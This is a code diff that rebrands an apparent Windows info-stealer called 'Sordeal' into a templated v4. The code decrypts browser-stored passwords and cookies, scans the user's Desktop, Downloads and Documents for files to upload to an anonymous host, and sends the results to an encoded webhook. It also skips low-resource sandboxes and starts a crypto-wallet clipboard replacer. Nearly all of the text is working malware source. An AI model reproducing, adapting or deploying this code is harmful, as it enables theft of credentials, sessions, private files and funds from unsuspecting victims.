+        memorystorage = int(fast_memory_storage)
+        storagespace = int(storage_space)
         cpu_count = psutil.cpu_count()
-        if fast_memory_storage <= 2 or storage_space <= 100 or cpu_count <= 1:
+        if memorystorage <= 2 or storagespace <= 100 or cpu_count <= 1:
             self.programExit()
 
     def keys_regex(self):
@@ -1866,7 +1919,7 @@ class NoDebugg(Functions):
 
 
 if __name__ == "__main__" and os.name == "nt":
-    asyncio.run(first_function_bc().init())
+    asyncio.run(first_srdl_func().init())
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
@@ -1877,7 +1930,7 @@ def find_in_config(e: str) -> str or bool | None:
     return __config__.get(e)
 
 
-hooks = f'{base64.b64decode(find_in_config("SO_webhook"))}'.replace(
+hooks = f'{base64.b64decode(find_in_config("websecret"))}'.replace(
     "b'", "").replace("'", "")
 hook = str(hooks)
 
@@ -1909,7 +1962,7 @@ def CryptUnprotectData(encrypted_bytes, entropy=b""):
         return GetData(blob_out)
 
 
-def Value_Dcryptage(buff, master_key=None):
+def decrypt_this_valuetage(buff, master_key=None):
     starts = buff.decode(encoding="utf8", errors="ignore")[:3]
     if starts == "v10" or starts == "v11":
         iv = buff[3:15]
@@ -1980,7 +2033,7 @@ def upload(name, tk=""):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     }
 
-    if name == "sopleasecheck_files":
+    if name == "checkthismadafaka":
         data = {
             "content": "",
 
@@ -1990,16 +2043,16 @@ def upload(name, tk=""):
                         {"name": "Interesting files found on user PC:", "value": tk}
                     ],
                     "author": {
-                        "name": f"SORDEAL v3",
-                        "url": "https://github.com/Sordeal",
-                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
+                        "name": f"{mynameis} v4",
+                        "url": f"https://github.com/{mynameis}",
+                        "icon_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/output-onlinegiftools.gif",
                     },
-                    "footer": {"text": "github.com/SORDEAL"},
+                    "footer": {"text": f"github.com/{mynameis}"},
                     "color": 16711718,
                 }
             ],
-            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
-            "username": "Sordeal - Stealer",
+            "avatar_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/{myname_little}.png",
+            "username": f"{mynameis} - Stealer",
             "attachments": [],
         }
         URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
@@ -2007,11 +2060,11 @@ def upload(name, tk=""):
     path = name
     files = {"file": open(path, "rb")}
 
-    if "SO_allpasswords" in name:
-        ra = " | ".join(da for da in paswWords)
+    if f"{mynameis}_allpasswords" in name:
+        ra = " | ".join(da for da in words_passw)
 
         if len(ra) > 1000:
-            rrr = Reformat(str(paswWords))
+            rrr = Reformat(str(words_passw))
             ra = " | ".join(da for da in rrr)
         data = {
             "content": "",
@@ -2019,25 +2072,25 @@ def upload(name, tk=""):
                 {
                     "fields": [{"name": "Passwords Found:", "value": ra}],
                     "author": {
-                        "name": f"SORDEAL v3",
-                        "url": "https://github.com/Sordeal",
-                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
+                        "name": f"{mynameis} v4",
+                        "url": f"https://github.com/{mynameis}",
+                        "icon_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/output-onlinegiftools.gif",
                     },
                     "footer": {
-                        "text": "github.com/SORDEAL",
+                        "text": f"github.com/{mynameis}",
                     },
                     "color": 16711718,
                 }
             ],
-            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
-            "username": "Sordeal - Stealer",
+            "avatar_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/{myname_little}.png",
+            "username": f"{mynameis} - Stealer",
             "attachments": [],
         }
         URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
-    if "SO_allcookies" in name:
-        rb = " | ".join(da for da in cookiWords)
+    if f"{mynameis}_allcookies" in name:
+        rb = " | ".join(da for da in words_cookies)
         if len(rb) > 1000:
-            rrrrr = Reformat(str(cookiWords))
+            rrrrr = Reformat(str(words_cookies))
             rb = " | ".join(da for da in rrrrr)
         data = {
             "content": "",
@@ -2045,18 +2098,18 @@ def upload(name, tk=""):
                 {
                     "fields": [{"name": "Cookies Found:", "value": rb}],
                     "author": {
-                        "name": f"SORDEAL v3",
-                        "url": "https://github.com/Sordeal",
-                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
+                        "name": f"{mynameis} v4",
+                        "url": f"https://github.com/{mynameis}",
+                        "icon_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/output-onlinegiftools.gif",
                     },
                     "footer": {
-                        "text": "github.com/SORDEAL",
+                        "text": f"github.com/{mynameis}",
                     },
                     "color": 16711718,
                 }
             ],
-            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
-            "username": "Sordeal - Stealer",
+            "avatar_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/{myname_little}.png",
+            "username": f"{mynameis} - Stealer",
             "attachments": [],
         }
         URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
@@ -2066,7 +2119,7 @@ def upload(name, tk=""):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\{name}.txt"
     with open(path, mode="w", encoding="utf-8") as f:
-        f.write(f"Created BY SHAMAN | https://github.com/Sordeal\n\n")
+        f.write(f"Created BY {mynameis} Team | https://github.com/{mynameis}\n\n")
         for line in data:
             if line[0] != "":
                 f.write(f"{line}\n")
@@ -2075,7 +2128,7 @@ def writeforfile(data, name):
 NotPSSW = []
 
 
-def SO_pleasefindmypassw(path, arg):
+def please_find_pswd(path, arg):
     global NotPSSW
     if not os.path.exists(path):
         return
@@ -2084,7 +2137,7 @@ def SO_pleasefindmypassw(path, arg):
         return
     tempfold = (
         temp
-        + "SO_is_here"
+        + "please_is_here"
         + "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                   for i in range(8))
         + ".db"
@@ -2107,24 +2160,24 @@ def SO_pleasefindmypassw(path, arg):
 
     for row in data:
         if row[0] != "":
-            for wa in keyword:
+            for wa in wordstocheckk:
                 old = wa
                 if "https" in wa:
                     tmp = wa
                     wa = tmp.split("[")[1].split("]")[0]
                 if wa in row[0]:
-                    if not old in paswWords:
-                        paswWords.append(old)
+                    if not old in words_passw:
+                        words_passw.append(old)
             NotPSSW.append(
-                f"URL: {row[0]} \n ID: {row[1]} \n Sordeal  Password: {Value_Dcryptage(row[2], master_key)}\n\n"
+                f"URL: {row[0]} \n ID: {row[1]} \n {mynameis}  Password: {decrypt_this_valuetage(row[2], master_key)}\n\n"
             )
-    writeforfile(NotPSSW, "SO_allpasswords")
+    writeforfile(NotPSSW, f"{mynameis}_allpasswords")
 
 
 Cookies = []
 
 
-def Get_SO_Cook(path, arg):
+def please_find_cooks(path, arg):
     global Cookies
     if not os.path.exists(path):
         return
@@ -2133,7 +2186,7 @@ def Get_SO_Cook(path, arg):
         return
     tempfold = (
         temp
-        + "SO_is_here"
+        + f"{mynameis}_is_here"
         + "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                   for i in range(8))
         + ".db"
@@ -2157,20 +2210,20 @@ def Get_SO_Cook(path, arg):
 
     for row in data:
         if row[0] != "":
-            for wa in keyword:
+            for wa in wordstocheckk:
                 old = wa
                 if "https" in wa:
                     tmp = wa
                     wa = tmp.split("[")[1].split("]")[0]
                 if wa in row[0]:
-                    if not old in cookiWords:
-                        cookiWords.append(old)
+                    if not old in words_cookies:
+                        words_cookies.append(old)
             Cookies.append(
                 f"{row[0]}	TRUE"
                 + "		"
-                + f"/FALSE	2597573456	{row[1]}	{Value_Dcryptage(row[2], master_key)}"
+                + f"/FALSE	2597573456	{row[1]}	{decrypt_this_valuetage(row[2], master_key)}"
             )
-    writeforfile(Cookies, "SO_allcookies")
+    writeforfile(Cookies, f"{mynameis}_allcookies")
 
 
 def checkIfProcessRunning(processName):
@@ -2232,7 +2285,7 @@ def ZipMyThings(path, arg, procc):
     os.remove(f"{pathC}/{name}.zip")
 
 
-def SO_Gather_All():
+def The_Pathbrows():
     "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >"
     browserPaths = [
         [
@@ -2314,13 +2367,13 @@ def SO_Gather_All():
     ]
 
     for patt in browserPaths:
-        a = threading.Thread(target=SO_pleasefindmypassw,
+        a = threading.Thread(target=please_find_pswd,
                              args=[patt[0], patt[3]])
         a.start()
         Threadlist.append(a)
     thread_bccookies = []
     for patt in browserPaths:
-        a = threading.Thread(target=Get_SO_Cook, args=[patt[0], patt[4]])
+        a = threading.Thread(target=please_find_cooks, args=[patt[0], patt[4]])
         a.start()
         thread_bccookies.append(a)
     for thread in thread_bccookies:
@@ -2339,11 +2392,11 @@ def SO_Gather_All():
     global upths
     upths = []
 
-    for file in ["SO_allpasswords.txt", "SO_allcookies.txt"]:
+    for file in [f"{mynameis}_allpasswords.txt", f"{mynameis}_allcookies.txt"]:
         upload(os.getenv("TEMP") + "\\" + file)
 
 
-def UploadTo_Anon(path):
+def transfer_uplaodthis(path):
     try:
         files = {"file": (path, open(path, mode="rb"))}
         ...
@@ -2355,7 +2408,7 @@ def UploadTo_Anon(path):
 
 
 def CreateFolder_(pathF, keywords):
-    global SO_create_files
+    global create_files
     maxfilesperdir = 7
     i = 0
     listOfFile = os.listdir(pathF)
@@ -2365,18 +2418,18 @@ def CreateFolder_(pathF, keywords):
             return
         i += 1
         if i <= maxfilesperdir:
-            url = UploadTo_Anon(pathF + "/" + file)
+            url = transfer_uplaodthis(pathF + "/" + file)
             ffound.append([pathF + "/" + file, url])
         else:
             break
-    SO_create_files.append(["folder", pathF + "/", ffound])
+    create_files.append(["folder", pathF + "/", ffound])
 
 
-SO_create_files = []
+create_files = []
 
 
-def SO_create_file(path, keywords):
-    global SO_create_files
+def create_file(path, keywords):
+    global create_files
     fifound = []
     listOfFile = os.listdir(path)
     for file in listOfFile:
@@ -2384,17 +2437,17 @@ def SO_create_file(path, keywords):
             if worf in file.lower():
                 if os.path.isfile(path + "/" + file) and ".txt" in file:
                     fifound.append(
-                        [path + "/" + file, UploadTo_Anon(path + "/" + file)]
+                        [path + "/" + file, transfer_uplaodthis(path + "/" + file)]
                     )
                     break
                 if os.path.isdir(path + "/" + file):
                     target = path + "/" + file
                     CreateFolder_(target, keywords)
                     break
-    SO_create_files.append(["folder", path, fifound])
+    create_files.append(["folder", path, fifound])
 
 
-def sopleasecheck_files():
+def checkthismadafaka():
     user = temp.split("\AppData")[0]
     path2search = [user + "/Desktop", user + "/Downloads", user + "/Documents"]
 
@@ -2425,17 +2478,18 @@ def sopleasecheck_files():
 
     wikith = []
     for patt in path2search:
-        sopleasecheck_files = threading.Thread(
-            target=SO_create_file, args=[patt, key_wordsFiles]
+        checkthismadafaka = threading.Thread(
+            target=create_file, args=[patt, key_wordsFiles]
         )
-        sopleasecheck_files.start()
-        wikith.append(sopleasecheck_files)
+        checkthismadafaka.start()
+        wikith.append(checkthismadafaka)
     return wikith
 
 
-global keyword, cookiWords, paswWords
+global wordstocheckk, words_cookies, words_passw
 
-keyword = [
+
+wordstocheckk = [
     "mail",
     "[coinbase](https://coinbase.com)",
     "[sellix](https://sellix.io)",
@@ -2479,35 +2533,35 @@ keyword = [
     "[netflix](https://netflix.com)",
 ]
 
-cookiWords = []
-paswWords = []
+words_cookies = []
+words_passw = []
 
-SO_Gather_All()
+The_Pathbrows()
 DETECTED = Trust(Cookies)
 
 if not DETECTED:
-    wikith = sopleasecheck_files()
+    wikith = checkthismadafaka()
 
     for thread in wikith:
         thread.join()
     time.sleep(0.2)
 
-    filetext = "```diff\n"
-    for arg in SO_create_files:
+    text_file = "```diff\n"
+    for arg in create_files:
         if len(arg[2]) != 0:
-            foldpath = arg[1]
-            foldlist = arg[2]
-            filetext += f"\n"
-            filetext += f"- {foldpath}\n"
+            doss_path = arg[1]
+            doss_list = arg[2]
+            text_file += f"\n"
+            text_file += f"- {doss_path}\n"
 
-            for ffil in foldlist:
-                a = ffil[0].split("/")
+            for fiifil in doss_list:
+                a = fiifil[0].split("/")
                 fileanme = a[len(a) - 1]
-                b = ffil[1]
-                filetext += f"+ Name: {fileanme}\n+ Link: {b}"
-                filetext += "\n"
-    filetext += "\n```"
+                b = fiifil[1]
+                text_file += f"+ Name: {fileanme}\n+ Link: {b}"
+                text_file += "\n"
+    text_file += "\n```"
 
-    upload("sopleasecheck_files", filetext)
-    auto = threading.Thread(target=AutoCopyWallet().run)
-    auto.start()
+    upload("checkthismadafaka", text_file)
+    autoo = threading.Thread(target=Replacer_Loop().run)
+    autoo.start()
